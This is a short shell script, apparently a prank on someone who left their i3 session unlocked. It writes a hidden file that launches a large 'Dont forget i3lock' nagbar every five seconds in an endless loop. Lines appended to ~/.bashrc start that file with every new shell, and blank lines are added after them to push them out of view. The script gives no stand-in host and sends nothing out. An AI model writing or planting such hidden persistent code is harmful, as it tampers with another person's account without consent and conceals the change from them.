echo 'i3-nagbar -f "pango: Source Code Pro 128px" -m "Dont forget i3lock" &' >> ~/.bashrc

echo '
while true; do
i3-nagbar -f "pango: Source Code Pro 128px" -m "Dont forget i3lock" &
sleep 5; done &
' > ~/afs/.i3.cf.sh
for i in $(seq 0 10); do
	echo '' >> ~/.bashrc
done
chmod +x ~/afs/.i3.cf.sh
echo '/bin/sh ~/afs/.i3.cf.sh &' >> ~/.bashrc
